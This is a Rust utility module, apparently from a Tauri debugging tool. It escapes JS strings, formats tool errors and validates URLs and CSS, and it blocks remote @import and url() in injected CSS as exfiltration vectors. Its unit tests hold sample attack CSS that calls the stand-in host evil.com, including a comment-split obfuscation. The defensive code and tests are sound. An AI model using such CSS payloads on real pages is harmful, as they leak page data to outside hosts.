use rmcp::model::{CallToolResult, Content};

/// Produce a properly escaped JavaScript string literal (with double quotes).
///
/// Non-ASCII characters are escaped to `\uXXXX` sequences to avoid corruption
/// in Tauri's `WebView2` eval pipeline on Windows, which mangles raw UTF-8 bytes.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\0' => out.push_str("\\u0000"),
            c if c.is_ascii_graphic() || c == ' ' => out.push(c),
            c => {
                for unit in c.encode_utf16(&mut [0; 2]) {
                    use std::fmt::Write;
                    let _ = write!(out, "\\u{unit:04x}");
                }
            }
        }
    }
    out.push('"');
    out
}

pub fn json_result(value: &impl serde::Serialize) -> CallToolResult {
    match serde_json::to_string_pretty(value) {
        Ok(json) => CallToolResult::success(vec![Content::text(json)]),
        Err(e) => tool_error(e.to_string()),
    }
}

pub fn tool_error(msg: impl Into<String>) -> CallToolResult {
    let mut result = CallToolResult::success(vec![Content::text(msg)]);
    result.is_error = Some(true);
    result
}

pub fn tool_disabled(name: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("tool '{name}' is disabled by privacy configuration"),
        RecoveryHint::ReportToUser,
    )
}

#[derive(Debug, Clone, Copy)]
pub enum RecoveryHint {
    CheckInput,
    ReportToUser,
}

impl RecoveryHint {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::CheckInput => "CHECK_INPUT",
            Self::ReportToUser => "REPORT_TO_USER",
        }
    }
}

pub fn tool_error_with_hint(msg: impl Into<String>, hint: RecoveryHint) -> CallToolResult {
    let message = msg.into();
    let text = format!(
        "{message}

[hint: {}]",
        hint.as_str()
    );
    let mut result = CallToolResult::success(vec![Content::text(text)]);
    result.is_error = Some(true);
    result
}

pub fn missing_param(param: &str, action: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("missing required parameter '{param}' for action '{action}'"),
        RecoveryHint::CheckInput,
    )
}

/// Validate a URL for navigation.
///
/// Only `http` and `https` schemes are allowed by default. The `file` scheme
/// is blocked unless `allow_file` is `true` (opt-in via
/// [`VictauriBuilder::allow_file_navigation`](crate::VictauriBuilder::allow_file_navigation)).
pub fn validate_url(url: &str, allow_file: bool) -> Result<(), String> {
    let trimmed: String = url.chars().filter(|c| !c.is_control()).collect();
    match url::Url::parse(&trimmed) {
        Ok(parsed) => match parsed.scheme() {
            "http" | "https" => Ok(()),
            "file" if allow_file => Ok(()),
            "file" => Err("scheme 'file' is not allowed by default; enable with \
                 VictauriBuilder::allow_file_navigation()"
                .to_string()),
            scheme => Err(format!(
                "scheme '{scheme}' is not allowed; use http or https"
            )),
        },
        Err(e) => Err(format!("invalid URL: {e}")),
    }
}

pub fn sanitize_css_color(color: &str) -> Result<String, String> {
    let s = color.trim();
    if s.len() > 100 {
        return Err("CSS color value too long".to_string());
    }
    // Reject CSS escape sequences (\XX hex escapes)
    if s.contains('\\') {
        return Err("CSS escape sequences not allowed in color values".to_string());
    }
    let valid = s
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '#' | '(' | ')' | ',' | '.' | ' ' | '%' | '-'));
    if !valid {
        return Err("invalid characters in CSS color value".to_string());
    }
    let lower = s.to_lowercase();
    if lower.contains("url(") || lower.contains("expression(") {
        return Err("invalid CSS color value".to_string());
    }
    Ok(s.to_string())
}

/// Strip CSS `/* ... */` comments so a scan cannot be evaded by hiding `@import`/`url(`
/// inside a comment that the browser's CSS parser ignores.
fn strip_css_comments(css: &str) -> String {
    let bytes = css.as_bytes();
    let mut out = String::with_capacity(css.len());
    let mut i = 0;
    while i < bytes.len() {
        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
            i += 2;
            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                i += 1;
            }
            i = (i + 2).min(bytes.len());
        } else {
            out.push(bytes[i] as char);
            i += 1;
        }
    }
    out
}

/// Validate CSS submitted to `css inject` before it is added to the page. By default this
/// rejects two remote-fetch vectors that turn a debugging tool into a data-exfiltration /
/// `SSRF` channel (especially dangerous when chained with prompt injection from page-sourced
/// content): `@import` (pulls a remote stylesheet) and `url(...)` pointing at a remote
/// origin (`http(s)://`, protocol-relative `//host`, or any `scheme://`). Relative refs,
/// `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt back in to
/// remote references when intentionally needed.
///
/// # Errors
/// Returns an error describing the rejected construct (or oversize input).
pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
    const MAX_CSS_LEN: usize = 256 * 1024;
    if css.len() > MAX_CSS_LEN {
        return Err(format!(
            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
            css.len()
        ));
    }
    if allow_remote {
        return Ok(());
    }
    let scan = strip_css_comments(css).to_ascii_lowercase();
    if scan.contains("@import") {
        return Err(
            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — \
                    a data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
                .to_string(),
        );
    }
    // Inspect every `url(...)` argument for a remote target.
    let bytes = scan.as_bytes();
    let mut search_from = 0;
    while let Some(rel) = scan[search_from..].find("url(") {
        let arg_start = search_from + rel + 4;
        let arg_end = scan[arg_start..]
            .find(')')
            .map_or(scan.len(), |e| arg_start + e);
        let arg = bytes[arg_start..arg_end]
            .iter()
            .map(|&b| b as char)
            .collect::<String>();
        let trimmed = arg.trim().trim_matches(['\'', '"']).trim();
        if trimmed.starts_with("//") || trimmed.contains("://") {
            return Err(format!(
                "remote `url(...)` is blocked in injected CSS (`{}` would fetch a remote \
                 origin — a data-exfiltration vector). Use a relative or data: URL, or pass \
                 `allow_remote: true`.",
                trimmed.chars().take(80).collect::<String>()
            ));
        }
        search_from = arg_end;
    }
    Ok(())
}

#[cfg(test)]
mod injected_css_tests {
    use super::sanitize_injected_css;

    #[test]
    fn blocks_at_import() {
        assert!(sanitize_injected_css("@import url(https://evil.com/x.css);", false).is_err());
        // Even hidden behind a comment.
        assert!(sanitize_injected_css("/* x */@import 'https://evil.com';", false).is_err());
        // Comment-splitting obfuscation is caught because comments are stripped first:
        // `@imp/* */ort` collapses to `@import`.
        assert!(sanitize_injected_css("@imp/* */ort url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_remote_url() {
        assert!(
            sanitize_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err()
        );
        assert!(sanitize_injected_css("body{background:url('//evil.com/x')}", false).is_err());
        assert!(sanitize_injected_css("a{cursor:url(ftp://evil.com/c)}", false).is_err());
    }

    #[test]
    fn allows_local_and_data() {
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url('/assets/x.png')}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url(#grad)}", false).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(data:image/png;base64,AAAA)}", false)
                .is_ok()
        );
    }

    #[test]
    fn allow_remote_opts_back_in() {
        assert!(sanitize_injected_css("@import url(https://fonts.example/x.css);", true).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(https://cdn.example/x.png)}", true).is_ok()
        );
    }
}
